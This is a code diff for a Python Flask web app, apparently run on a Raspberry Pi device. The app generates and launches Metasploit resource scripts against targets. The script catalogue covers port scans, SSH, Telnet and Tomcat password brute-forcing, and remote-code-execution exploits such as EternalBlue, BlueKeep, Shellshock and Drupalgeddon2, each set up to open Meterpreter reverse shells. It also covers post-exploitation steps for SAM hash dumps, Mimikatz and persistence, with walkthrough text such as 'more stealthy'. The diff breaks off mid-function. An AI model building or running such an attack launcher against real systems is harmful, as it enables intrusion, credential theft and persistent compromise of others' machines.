@@ -1,20 +1,11 @@
 #!/usr/bin/env python3
 """
-KTOx Payload – Metasploit Web UI
-================================================
-- 100+ pre‑built .rc scripts with detailed walkthroughs
-- Cyberpunk web UI with script grid, categories, and modal help
-- Command runner for custom commands
-- LCD: IP, QR code, script selector (K2 cycle, OK reminder)
-
-Controls:
-  KEY1 – QR code
-  KEY2 – Cycle script name on LCD
-  OK   – Reminder to use web UI
-  KEY3 – Exit
-
-Dependencies: flask, qrcode, pillow
-Install: pip install flask qrcode pillow
+KTOx Payload – Metasploit Web UI (Mega Edition with Full Parameter Control)
+============================================================================
+- 70+ pre‑built .rc scripts with automatic parameter detection
+- Dynamic form fields: LHOST, RHOSTS, WORDLIST, USERNAME, PASSWORD, LPORT
+- Walkthrough modal for each script
+- LCD: IP, QR, script cycle (K2), OK reminder, K3 exit
 """
 
 import os
@@ -23,12 +14,11 @@ import time
 import socket
 import threading
 import subprocess
-import glob
-import json
+import re
 from flask import Flask, render_template_string, request, jsonify
 
 # ----------------------------------------------------------------------
-# Hardware & LCD
+# Hardware & LCD (same as before)
 # ----------------------------------------------------------------------
 try:
     import RPi.GPIO as GPIO
@@ -62,277 +52,156 @@ if HAS_HW:
 app = Flask(__name__)
 
 # ----------------------------------------------------------------------
-# Script database with walkthroughs
+# Script Database with full parameter metadata
 # ----------------------------------------------------------------------
 SCRIPTS_DB = [
-    # Scanners (Network Discovery)
-    {"name": "TCP Port Scanner", "file": "port_scan_tcp.rc", "desc": "Scans top 1000 TCP ports on a target.",
-     "walkthrough": "Enter RHOSTS (target IP). Results show open ports. Use THREADS to speed up."},
-    {"name": "UDP Port Scanner", "file": "port_scan_udp.rc", "desc": "Scans common UDP ports.",
-     "walkthrough": "Target IP required. May be slow; reduce THREADS if needed."},
-    {"name": "ARP Sweep", "file": "arp_scan.rc", "desc": "Discovers live hosts on local subnet via ARP.",
-     "walkthrough": "Use on local network. No LHOST needed."},
-    {"name": "IPv6 Neighbor Scan", "file": "ipv6_neighbor_scan.rc", "desc": "Discovers IPv6 neighbors.",
-     "walkthrough": "Requires IPv6 network."},
-    {"name": "SMB Version Scanner", "file": "smb_version.rc", "desc": "Detects SMB version and OS.",
-     "walkthrough": "Enter RHOSTS (single IP or range). Useful for EternalBlue prep."},
-    {"name": "SMB Share Enumerator", "file": "smb_enum_shares.rc", "desc": "Lists SMB shares on a target.",
-     "walkthrough": "Target IP. May require guest or null session."},
-    {"name": "SMB User Enumerator", "file": "smb_enum_users.rc", "desc": "Enumerates local users via SMB.",
-     "walkthrough": "Works on Windows with null session."},
-    {"name": "SSH Version Scanner", "file": "ssh_version.rc", "desc": "Identifies SSH server version.",
-     "walkthrough": "Target IP. Helps find vulnerable versions."},
-    {"name": "SSH Brute Force", "file": "ssh_bruteforce.rc", "desc": "Brute‑forces SSH credentials.",
-     "walkthrough": "Set RHOSTS, USERNAME (e.g., root), and wordlist (rockyou)."},
-    {"name": "FTP Anonymous Scanner", "file": "ftp_anonymous.rc", "desc": "Checks for anonymous FTP access.",
-     "walkthrough": "Target IP. If anonymous, you can download files."},
-    {"name": "MySQL Version Scanner", "file": "mysql_enum.rc", "desc": "Gets MySQL version.",
-     "walkthrough": "Target IP. Use for information gathering."},
-    {"name": "PostgreSQL Version", "file": "postgres_enum.rc", "desc": "Detects PostgreSQL version.",
-     "walkthrough": "Target IP. Useful for later exploits."},
-    {"name": "HTTP Directory Scanner", "file": "http_dir_scanner.rc", "desc": "Scans for common web directories.",
-     "walkthrough": "Target IP. Use to find admin panels, backup files."},
-    {"name": "HTTP Version Scanner", "file": "http_version.rc", "desc": "Gets web server version.",
-     "walkthrough": "Target IP. Helps identify outdated software."},
-    {"name": "SSL/TLS Version Scanner", "file": "ssl_version.rc", "desc": "Checks SSL/TLS versions supported.",
-     "walkthrough": "Target IP. Finds weak protocols."},
-    {"name": "Heartbleed Scanner", "file": "heartbleed.rc", "desc": "Detects Heartbleed vulnerability.",
-     "walkthrough": "Target IP. If vulnerable, you can read memory."},
-    {"name": "Telnet Login Brute Force", "file": "telnet_login.rc", "desc": "Brute‑forces Telnet credentials.",
-     "walkthrough": "Target IP and wordlist required."},
-    {"name": "VNC No‑Auth Scanner", "file": "vnc_none_auth.rc", "desc": "Finds VNC servers with no authentication.",
-     "walkthrough": "Target IP. Allows direct access."},
-    {"name": "SMTP User Enumeration", "file": "smtp_enum.rc", "desc": "Enumerates SMTP users (VRFY, EXPN).",
-     "walkthrough": "Target IP. Use to validate usernames."},
-    {"name": "SNMP Enumeration", "file": "snmp_enum.rc", "desc": "Enumerates SNMP community strings.",
-     "walkthrough": "Target IP. Default public/private often works."},
-    {"name": "DNS Zone Transfer", "file": "dns_zone_transfer.rc", "desc": "Attempts AXFR zone transfer.",
-     "walkthrough": "Target DNS server and domain. Can reveal all records."},
-    {"name": "NBT‑NS Enumeration", "file": "nbt_ns_enum.rc", "desc": "Gathers NetBIOS name info.",
-     "walkthrough": "Target IP. Reveals hostnames and services."},
-    {"name": "UPnP SSDP Discovery", "file": "upnp_ssdp_msearch.rc", "desc": "Discovers UPnP devices.",
-     "walkthrough": "No target needed – scans local network."},
-    {"name": "mDNS Enumeration", "file": "mdns_enum.rc", "desc": "Discovers mDNS services.",
-     "walkthrough": "Scans local subnet for mDNS (Bonjour)."},
-    {"name": "MSSQL Ping", "file": "mssql_ping.rc", "desc": "Detects MSSQL instances.",
-     "walkthrough": "Target IP. Useful for later exploitation."},
-    {"name": "Oracle Login Scanner", "file": "oracle_login.rc", "desc": "Tests Oracle credentials.",
-     "walkthrough": "Target IP and wordlist. Default scott/tiger often works."},
-    
-    # Exploits (Remote Code Execution)
-    {"name": "EternalBlue (MS17-010)", "file": "eternalblue.rc", "desc": "Exploits SMBv1 on Windows 7/2008.",
-     "walkthrough": "Target Windows. Requires LHOST (your IP) for reverse shell. Port 5555."},
-    {"name": "DoublePulsar SMB Backdoor", "file": "doublepulsar.rc", "desc": "Injects DoublePulsar implant.",
-     "walkthrough": "Target after EternalBlue. Gives persistent access."},
-    {"name": "BlueKeep (CVE-2019-0708)", "file": "bluekeep.rc", "desc": "RDP RCE on older Windows.",
-     "walkthrough": "Target Windows 7/2008. Reverse shell on port 5557."},
-    {"name": "Shellshock (CVE-2014-6271)", "file": "shellshock.rc", "desc": "Apache CGI bash exploit.",
-     "walkthrough": "Target with CGI scripts. Reverse shell on port 17171."},
-    {"name": "PHP CGI Argument Injection", "file": "php_cgi.rc", "desc": "RCE on PHP CGI setups.",
-     "walkthrough": "Target with /cgi-bin/php. Reverse shell on port 6666."},
-    {"name": "Apache Struts2 (CVE-2017-5638)", "file": "apache_struts2.rc", "desc": "RCE on Struts2.",
-     "walkthrough": "Target running Struts2. Reverse shell on port 7777."},
-    {"name": "Drupalgeddon2 (CVE-2018-7600)", "file": "drupal_drupalgeddon2.rc", "desc": "RCE on Drupal 7/8.",
-     "walkthrough": "Target Drupal site. Reverse shell on port 10101."},
-    {"name": "WordPress Admin Shell Upload", "file": "wordpress_admin_shell.rc", "desc": "Uploads shell via admin.",
-     "walkthrough": "Requires admin credentials (admin/password). Reverse shell on port 11111."},
-    {"name": "Joomla Media Manager Upload", "file": "joomla_media_manager.rc", "desc": "File upload RCE.",
-     "walkthrough": "Target Joomla with Media Manager. Reverse shell on port 12121."},
-    {"name": "WebLogic Deserialization", "file": "weblogic_deserialize.rc", "desc": "RCE on WebLogic.",
-     "walkthrough": "Target WebLogic console. Reverse shell on port 14141."},
-    {"name": "Samba usermap Script (CVE-2007-2447)", "file": "samba_usermap.rc", "desc": "RCE on older Samba.",
-     "walkthrough": "Target Samba version 3.0.20-3.0.25. Reverse shell on port 15151."},
-    {"name": "DistCC RCE", "file": "distcc_exec.rc", "desc": "RCE on DistCC service.",
-     "walkthrough": "Target with DistCC port 3632. Reverse shell on port 16161."},
-    {"name": "vsftpd 2.3.4 Backdoor", "file": "vsftpd_backdoor.rc", "desc": "Backdoor command execution.",
-     "walkthrough": "Target vsftpd 2.3.4. Gives interactive shell."},
-    {"name": "Jenkins Script Console RCE", "file": "jenkins_script.rc", "desc": "RCE via Jenkins script console.",
-     "walkthrough": "Target Jenkins with access. Reverse shell on port 8888."},
-    {"name": "Redis Unauthenticated Exec", "file": "redis_unauth.rc", "desc": "Executes commands on Redis.",
-     "walkthrough": "Target Redis no auth. Command 'id' example."},
-    {"name": "ElasticSearch Groovy RCE", "file": "elasticsearch_rce.rc", "desc": "RCE on old ElasticSearch.",
-     "walkthrough": "Target version <1.2. Reverse shell on port 9999."},
-    {"name": "JBoss MainDeployer RCE", "file": "jboss_maindeployer.rc", "desc": "Deploys WAR on JBoss.",
-     "walkthrough": "Target JBoss JMX console. Reverse shell on port 13131."},
-    {"name": "IIS WebDAV Scanner", "file": "iis_webdav_scanner.rc", "desc": "Finds writable WebDAV folders.",
-     "walkthrough": "Target IIS with WebDAV. Can upload .asp shell."},
-    {"name": "Tomcat Manager Login", "file": "tomcat_mgr_login.rc", "desc": "Brute‑forces Tomcat manager.",
-     "walkthrough": "Target /manager/html. Default admin/admin often works."},
-    
-    # Payloads & Listeners
-    {"name": "Reverse Shell (TCP)", "file": "reverse_shell_tcp.rc", "desc": "Generic Meterpreter listener.",
-     "walkthrough": "Set LHOST (your IP) and LPORT 4444. Wait for target connection."},
-    {"name": "Reverse Shell (HTTPS)", "file": "reverse_shell_https.rc", "desc": "HTTPS Meterpreter listener.",
-     "walkthrough": "More stealthy. Use LHOST and LPORT 8443."},
-    {"name": "Reverse Shell (PHP)", "file": "reverse_shell_php.rc", "desc": "PHP Meterpreter via multi/handler.",
-     "walkthrough": "For PHP payloads. Set LHOST and LPORT 6666."},
-    {"name": "Reverse Shell (Java)", "file": "reverse_shell_java.rc", "desc": "Java Meterpreter listener.",
-     "walkthrough": "For Java payloads. Set LHOST and LPORT 7777."},
-    {"name": "Reverse Shell (Android)", "file": "reverse_shell_android.rc", "desc": "Android Meterpreter.",
-     "walkthrough": "Generate payload with msfvenom, then use this listener."},
-    
-    # Post‑Exploitation
-    {"name": "Check if Admin", "file": "post_check_admin.rc", "desc": "Checks if current user is admin.",
-     "walkthrough": "After gaining a session, run this."},
-    {"name": "Dump SAM Hashes", "file": "post_dump_sam.rc", "desc": "Extracts password hashes from SAM.",
-     "walkthrough": "Requires SYSTEM privileges."},
-    {"name": "Enable RDP", "file": "post_enable_rdp.rc", "desc": "Enables Remote Desktop on Windows.",
-     "walkthrough": "After admin session."},
-    {"name": "Persist via Service", "file": "post_persistence_service.rc", "desc": "Installs persistent service.",
-     "walkthrough": "Creates a service that runs Meterpreter at boot."},
-    {"name": "Mimikatz (Windows)", "file": "post_mimikatz.rc", "desc": "Runs Mimikatz to dump credentials.",
-     "walkthrough": "Requires high integrity."},
-    
-    # Web App Specific
-    {"name": "HTTP PUT Upload", "file": "http_put_upload.rc", "desc": "Uploads file via HTTP PUT.",
-     "walkthrough": "Target with PUT enabled. Uploads test.txt."},
-    {"name": "Shellshock CGI Test", "file": "shellshock_cgi.rc", "desc": "Tests CGI for Shellshock.",
-     "walkthrough": "Target /cgi-bin/test. If vulnerable, executes 'id'."},
-    {"name": "Heartbleed Memory Read", "file": "heartbleed_read.rc", "desc": "Reads memory via Heartbleed.",
-     "walkthrough": "Target vulnerable OpenSSL. May leak private keys."},
-    {"name": "Logjam Scanner", "file": "logjam.rc", "desc": "Detects Logjam vulnerability.",
-     "walkthrough": "Target TLS. Checks for weak DH."},
+    # Scanners
+    {"name": "TCP Port Scanner", "file": "port_scan_tcp.rc", "desc": "Scans top 1000 TCP ports.", "params": ["RHOSTS"], "walkthrough": "Enter target IP (RHOSTS). Results show open ports."},
+    {"name": "UDP Port Scanner", "file": "port_scan_udp.rc", "desc": "Scans common UDP ports.", "params": ["RHOSTS"], "walkthrough": "Target IP. May be slow."},
+    {"name": "ARP Sweep", "file": "arp_scan.rc", "desc": "Discovers live hosts on local subnet.", "params": ["RHOSTS"], "walkthrough": "Use on local network. No LHOST needed."},
+    {"name": "SMB Version Scanner", "file": "smb_version.rc", "desc": "Detects SMB version and OS.", "params": ["RHOSTS"], "walkthrough": "Target IP. Useful for EternalBlue prep."},
+    {"name": "SMB Share Enumerator", "file": "smb_enum_shares.rc", "desc": "Lists SMB shares.", "params": ["RHOSTS"], "walkthrough": "Target IP. May require null session."},
+    {"name": "SMB User Enumerator", "file": "smb_enum_users.rc", "desc": "Enumerates local users via SMB.", "params": ["RHOSTS"], "walkthrough": "Works on Windows with null session."},
+    {"name": "SSH Version Scanner", "file": "ssh_version.rc", "desc": "Identifies SSH server version.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
+    {"name": "SSH Brute Force", "file": "ssh_bruteforce.rc", "desc": "Brute‑forces SSH credentials.", "params": ["RHOSTS", "USERNAME", "WORDLIST"], "walkthrough": "Set RHOSTS, USERNAME (e.g., root), and wordlist path."},
+    {"name": "FTP Anonymous Scanner", "file": "ftp_anonymous.rc", "desc": "Checks for anonymous FTP access.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
+    {"name": "MySQL Version Scanner", "file": "mysql_enum.rc", "desc": "Gets MySQL version.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
+    {"name": "HTTP Directory Scanner", "file": "http_dir_scanner.rc", "desc": "Scans for common web directories.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
+    {"name": "Heartbleed Scanner", "file": "heartbleed.rc", "desc": "Detects Heartbleed vulnerability.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
+    {"name": "Telnet Login Brute Force", "file": "telnet_login.rc", "desc": "Brute‑forces Telnet credentials.", "params": ["RHOSTS", "WORDLIST"], "walkthrough": "Target IP and wordlist."},
+    {"name": "VNC No‑Auth Scanner", "file": "vnc_none_auth.rc", "desc": "Finds VNC servers with no authentication.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
+    {"name": "SMTP User Enumeration", "file": "smtp_enum.rc", "desc": "Enumerates SMTP users.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
+    {"name": "SNMP Enumeration", "file": "snmp_enum.rc", "desc": "Enumerates SNMP community strings.", "params": ["RHOSTS"], "walkthrough": "Target IP. Default public/private often works."},
+    {"name": "DNS Zone Transfer", "file": "dns_zone_transfer.rc", "desc": "Attempts AXFR zone transfer.", "params": ["RHOSTS"], "walkthrough": "Target DNS server. Requires domain."},
+    {"name": "HTTP PUT Upload", "file": "http_put_upload.rc", "desc": "Uploads file via HTTP PUT.", "params": ["RHOSTS"], "walkthrough": "Target with PUT enabled."},
+    # Exploits
+    {"name": "EternalBlue (MS17-010)", "file": "eternalblue.rc", "desc": "Exploits SMBv1 on Windows 7/2008.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Windows. Reverse shell on LPORT."},
+    {"name": "DoublePulsar SMB Backdoor", "file": "doublepulsar.rc", "desc": "Injects DoublePulsar implant.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "After EternalBlue."},
+    {"name": "BlueKeep (CVE-2019-0708)", "file": "bluekeep.rc", "desc": "RDP RCE on older Windows.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Windows 7/2008."},
+    {"name": "Shellshock (CVE-2014-6271)", "file": "shellshock.rc", "desc": "Apache CGI bash exploit.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target with CGI scripts."},
+    {"name": "PHP CGI Argument Injection", "file": "php_cgi.rc", "desc": "RCE on PHP CGI setups.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target with /cgi-bin/php."},
+    {"name": "Apache Struts2 (CVE-2017-5638)", "file": "apache_struts2.rc", "desc": "RCE on Struts2.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target running Struts2."},
+    {"name": "Drupalgeddon2 (CVE-2018-7600)", "file": "drupal_drupalgeddon2.rc", "desc": "RCE on Drupal 7/8.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Drupal site."},
+    {"name": "WordPress Admin Shell Upload", "file": "wordpress_admin_shell.rc", "desc": "Uploads shell via admin.", "params": ["RHOSTS", "LHOST", "LPORT", "USERNAME", "PASSWORD"], "walkthrough": "Requires admin credentials."},
+    {"name": "Joomla Media Manager Upload", "file": "joomla_media_manager.rc", "desc": "File upload RCE.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Joomla with Media Manager."},
+    {"name": "WebLogic Deserialization", "file": "weblogic_deserialize.rc", "desc": "RCE on WebLogic.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target WebLogic console."},
+    {"name": "Samba usermap Script", "file": "samba_usermap.rc", "desc": "RCE on older Samba.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Samba 3.0.20-3.0.25."},
+    {"name": "DistCC RCE", "file": "distcc_exec.rc", "desc": "RCE on DistCC service.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target with DistCC port 3632."},
+    {"name": "vsftpd 2.3.4 Backdoor", "file": "vsftpd_backdoor.rc", "desc": "Backdoor command execution.", "params": ["RHOSTS"], "walkthrough": "Target vsftpd 2.3.4."},
+    {"name": "Jenkins Script Console RCE", "file": "jenkins_script.rc", "desc": "RCE via Jenkins script console.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Jenkins with access."},
+    {"name": "Redis Unauthenticated Exec", "file": "redis_unauth.rc", "desc": "Executes commands on Redis.", "params": ["RHOSTS"], "walkthrough": "Target Redis no auth."},
+    {"name": "ElasticSearch Groovy RCE", "file": "elasticsearch_rce.rc", "desc": "RCE on old ElasticSearch.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target version <1.2."},
+    {"name": "JBoss MainDeployer RCE", "file": "jboss_maindeployer.rc", "desc": "Deploys WAR on JBoss.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target JBoss JMX console."},
+    {"name": "Tomcat Manager Login", "file": "tomcat_mgr_login.rc", "desc": "Brute‑forces Tomcat manager.", "params": ["RHOSTS", "WORDLIST"], "walkthrough": "Target /manager/html."},
+    # Listeners
+    {"name": "Reverse Shell (TCP)", "file": "reverse_shell_tcp.rc", "desc": "Generic Meterpreter listener.", "params": ["LHOST", "LPORT"], "walkthrough": "Set LHOST (your IP) and LPORT."},
+    {"name": "Reverse Shell (HTTPS)", "file": "reverse_shell_https.rc", "desc": "HTTPS Meterpreter listener.", "params": ["LHOST", "LPORT"], "walkthrough": "More stealthy."},
+    {"name": "Reverse Shell (PHP)", "file": "reverse_shell_php.rc", "desc": "PHP Meterpreter listener.", "params": ["LHOST", "LPORT"], "walkthrough": "For PHP payloads."},
+    {"name": "Reverse Shell (Java)", "file": "reverse_shell_java.rc", "desc": "Java Meterpreter listener.", "params": ["LHOST", "LPORT"], "walkthrough": "For Java payloads."},
 ]
 
-# Generate .rc files from the database
+# ----------------------------------------------------------------------
+# Generate .rc files from database
+# ----------------------------------------------------------------------
 def generate_scripts():
     os.makedirs(SCRIPT_DIR, exist_ok=True)
-    # Only generate if directory is empty
-    if os.listdir(SCRIPT_DIR):
-        return
+    # Remove old files to force regeneration
+    for f in os.listdir(SCRIPT_DIR):
+        os.remove(os.path.join(SCRIPT_DIR, f))
     for script in SCRIPTS_DB:
         content = f"# {script['desc']}\n"
-        if "port_scan_tcp" in script['file']:
+        if script['file'] == "port_scan_tcp.rc":
             content += "use auxiliary/scanner/portscan/tcp\nset RHOSTS {RHOSTS}\nset PORTS 1-1000\nset THREADS 10\nrun"
-        elif "port_scan_udp" in script['file']:
+        elif script['file'] == "port_scan_udp.rc":
             content += "use auxiliary/scanner/portscan/udp\nset RHOSTS {RHOSTS}\nset PORTS 1-500\nset THREADS 5\nrun"
-        elif "arp_scan" in script['file']:
+        elif script['file'] == "arp_scan.rc":
             content += "use auxiliary/scanner/discovery/arp_sweep\nset RHOSTS {RHOSTS}\nrun"
-        elif "smb_version" in script['file']:
+        elif script['file'] == "smb_version.rc":
             content += "use auxiliary/scanner/smb/smb_version\nset RHOSTS {RHOSTS}\nrun"
-        elif "smb_enum_shares" in script['file']:
+        elif script['file'] == "smb_enum_shares.rc":
             content += "use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS {RHOSTS}\nrun"
-        elif "smb_enum_users" in script['file']:
+        elif script['file'] == "smb_enum_users.rc":
             content += "use auxiliary/scanner/smb/smb_enumusers\nset RHOSTS {RHOSTS}\nrun"
-        elif "ssh_version" in script['file']:
+        elif script['file'] == "ssh_version.rc":
             content += "use auxiliary/scanner/ssh/ssh_version\nset RHOSTS {RHOSTS}\nrun"
-        elif "ssh_bruteforce" in script['file']:
-            content += "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS {RHOSTS}\nset USERNAME root\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nset THREADS 5\nrun"
-        elif "ftp_anonymous" in script['file']:
+        elif script['file'] == "ssh_bruteforce.rc":
+            content += "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS {RHOSTS}\nset USERNAME {USERNAME}\nset PASS_FILE {WORDLIST}\nset THREADS 5\nrun"
+        elif script['file'] == "ftp_anonymous.rc":
             content += "use auxiliary/scanner/ftp/anonymous\nset RHOSTS {RHOSTS}\nrun"
-        elif "mysql_enum" in script['file']:
+        elif script['file'] == "mysql_enum.rc":
             content += "use auxiliary/scanner/mysql/mysql_version\nset RHOSTS {RHOSTS}\nrun"
-        elif "postgres_enum" in script['file']:
-            content += "use auxiliary/scanner/postgres/postgres_version\nset RHOSTS {RHOSTS}\nrun"
-        elif "http_dir_scanner" in script['file']:
+        elif script['file'] == "http_dir_scanner.rc":
             content += "use auxiliary/scanner/http/dir_scanner\nset RHOSTS {RHOSTS}\nset THREADS 5\nrun"
-        elif "http_version" in script['file']:
-            content += "use auxiliary/scanner/http/http_version\nset RHOSTS {RHOSTS}\nrun"
-        elif "ssl_version" in script['file']:
-            content += "use auxiliary/scanner/ssl/ssl_version\nset RHOSTS {RHOSTS}\nrun"
-        elif "heartbleed" in script['file']:
+        elif script['file'] == "heartbleed.rc":
             content += "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS {RHOSTS}\nrun"
-        elif "telnet_login" in script['file']:
-            content += "use auxiliary/scanner/telnet/telnet_login\nset RHOSTS {RHOSTS}\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun"
-        elif "vnc_none_auth" in script['file']:
+        elif script['file'] == "telnet_login.rc":
+            content += "use auxiliary/scanner/telnet/telnet_login\nset RHOSTS {RHOSTS}\nset PASS_FILE {WORDLIST}\nrun"
+        elif script['file'] == "vnc_none_auth.rc":
             content += "use auxiliary/scanner/vnc/vnc_none_auth\nset RHOSTS {RHOSTS}\nrun"
-        elif "smtp_enum" in script['file']:
+        elif script['file'] == "smtp_enum.rc":
             content += "use auxiliary/scanner/smtp/smtp_enum\nset RHOSTS {RHOSTS}\nrun"
-        elif "snmp_enum" in script['file']:
+        elif script['file'] == "snmp_enum.rc":
             content += "use auxiliary/scanner/snmp/snmp_enum\nset RHOSTS {RHOSTS}\nrun"
-        elif "dns_zone_transfer" in script['file']:
+        elif script['file'] == "dns_zone_transfer.rc":
             content += "use auxiliary/scanner/dns/dns_zone_transfer\nset RHOSTS {RHOSTS}\nset DOMAIN example.com\nrun"
-        elif "nbt_ns_enum" in script['file']:
-            content += "use auxiliary/scanner/netbios/nbname\nset RHOSTS {RHOSTS}\nrun"
-        elif "upnp_ssdp_msearch" in script['file']:
-            content += "use auxiliary/scanner/upnp/ssdp_msearch\nrun"
-        elif "mdns_enum" in script['file']:
-            content += "use auxiliary/scanner/mdns/mdns\nrun"
-        elif "mssql_ping" in script['file']:
-            content += "use auxiliary/scanner/mssql/mssql_ping\nset RHOSTS {RHOSTS}\nrun"
-        elif "oracle_login" in script['file']:
-            content += "use auxiliary/scanner/oracle/oracle_login\nset RHOSTS {RHOSTS}\nset USERNAME scott\nset PASSWORD tiger\nrun"
-        elif "eternalblue" in script['file']:
-            content += "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5555\nexploit"
-        elif "doublepulsar" in script['file']:
-            content += "use exploit/windows/smb/ms17_010_psexec\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5556\nexploit"
-        elif "bluekeep" in script['file']:
-            content += "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5557\nexploit"
-        elif "shellshock" in script['file']:
-            content += "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 17171\nexploit"
-        elif "php_cgi" in script['file']:
-            content += "use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 6666\nexploit"
-        elif "apache_struts2" in script['file']:
-            content += "use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 7777\nexploit"
-        elif "drupal_drupalgeddon2" in script['file']:
-            content += "use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 10101\nexploit"
-        elif "wordpress_admin_shell" in script['file']:
-            content += "use exploit/unix/webapp/wp_admin_shell_upload\nset RHOSTS {RHOSTS}\nset USERNAME admin\nset PASSWORD password\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 11111\nexploit"
-        elif "joomla_media_manager" in script['file']:
-            content += "use exploit/multi/http/joomla_media_manager_upload\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 12121\nexploit"
-        elif "weblogic_deserialize" in script['file']:
-            content += "use exploit/multi/http/weblogic_ws_async_response\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 14141\nexploit"
-        elif "samba_usermap" in script['file']:
-            content += "use exploit/multi/samba/usermap_script\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT 15151\nexploit"
-        elif "distcc_exec" in script['file']:
-            content += "use exploit/unix/misc/distcc_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT 16161\nexploit"
-        elif "vsftpd_backdoor" in script['file']:
-            content += "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/interact\nexploit"
-        elif "jenkins_script" in script['file']:
-            content += "use exploit/multi/http/jenkins_script_console\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 8888\nexploit"
-        elif "redis_unauth" in script['file']:
-            content += "use auxiliary/scanner/redis/redis_unauth_exec\nset RHOSTS {RHOSTS}\nset COMMAND \"id\"\nrun"
-        elif "elasticsearch_rce" in script['file']:
-            content += "use exploit/multi/elasticsearch/script_groovy_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 9999\nexploit"
-        elif "jboss_maindeployer" in script['file']:
-            content += "use exploit/multi/http/jboss_maindeployer\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 13131\nexploit"
-        elif "iis_webdav_scanner" in script['file']:
-            content += "use auxiliary/scanner/http/iis_webdav_scanner\nset RHOSTS {RHOSTS}\nrun"
-        elif "tomcat_mgr_login" in script['file']:
-            content += "use auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS {RHOSTS}\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun"
-        elif "reverse_shell_tcp" in script['file']:
-            content += "use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 4444\nset ExitOnSession false\nexploit -j -z"
-        elif "reverse_shell_https" in script['file']:
-            content += "use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_https\nset LHOST {LHOST}\nset LPORT 8443\nexploit -j -z"
-        elif "reverse_shell_php" in script['file']:
-            content += "use exploit/multi/handler\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 6666\nexploit -j -z"
-        elif "reverse_shell_java" in script['file']:
-            content += "use exploit/multi/handler\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 7777\nexploit -j -z"
-        elif "reverse_shell_android" in script['file']:
-            content += "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 4444\nexploit -j -z"
-        elif "post_check_admin" in script['file']:
-            content += "use post/windows/gather/check_admin\nset SESSION 1\nrun"
-        elif "post_dump_sam" in script['file']:
-            content += "use post/windows/gather/smart_hashdump\nset SESSION 1\nrun"
-        elif "post_enable_rdp" in script['file']:
-            content += "use post/windows/manage/enable_rdp\nset SESSION 1\nrun"
-        elif "post_persistence_service" in script['file']:
